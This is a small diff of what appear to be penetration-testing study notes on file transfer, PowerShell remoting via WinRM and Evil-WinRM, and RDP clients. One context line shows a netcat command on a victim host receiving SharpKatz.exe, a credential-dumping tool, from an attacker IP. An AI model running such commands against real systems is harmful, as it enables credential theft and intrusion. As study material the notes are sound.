@@ -54,7 +54,8 @@ victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
 
 * Powershell FT
 ** Powershell remoting
-= =WinRM=
+- =WinRM=
+# check (=Evil-WinRM=)
 - exec scripts on remote computer using PS sessions
 - creates =HTTP= (TCP/5985) && =HTTPS= (TCP/5986) listener
 - need admin access / member of =Remote Mgmt Users= have explicit permissions for remoting
@@ -68,7 +69,7 @@ RemotePort       : 5985
 InterfaceAlias   : Ethernet0
 SourceAddress    : 192.168.1.100
 TcpTestSucceeded : True
-#+end_src>
+#+end_src
 * RDP
 - =xfreedp= / =rdesktop= -> linux
 # allow copy from target to RDP
